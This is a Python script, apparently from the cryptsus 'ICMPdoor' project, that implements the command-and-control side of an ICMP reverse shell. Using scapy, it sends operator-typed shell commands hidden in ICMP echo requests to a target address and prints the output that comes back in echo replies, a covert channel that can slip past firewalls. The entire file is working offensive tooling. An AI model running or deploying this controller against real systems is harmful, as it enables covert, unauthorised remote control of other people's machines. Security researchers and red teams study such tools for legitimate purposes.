#!/usr/bin/env python3
#ICMPdoor (ICMP reverse shell) C2
#By krabelize | cryptsus.com
#More info: https://cryptsus.com/blog/icmp-reverse-shell.html
from scapy.all import sr,IP,ICMP,Raw,sniff
from multiprocessing import Process
import argparse

#Variables
icmp_id = int(13170)
ttl = int(64)

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def sniffer():
    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")

def shell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
        icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(icmppacket)
    else:
        pass

def main():
    p = Process(target=sniffer)
    p.start()
    print("[+]ICMP C2 started!")
    while True:
        icmpshell = input("shell: ")
        if icmpshell == 'exit':
            print("[+]Stopping ICMP C2...")
            p.terminate()
            break
        elif icmpshell == '':
            pass
        else:
            payload = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=8,id=icmp_id)/Raw(load=icmpshell))
            sr(payload, timeout=0, verbose=0)
    p.join()

if __name__ == "__main__":
    main()
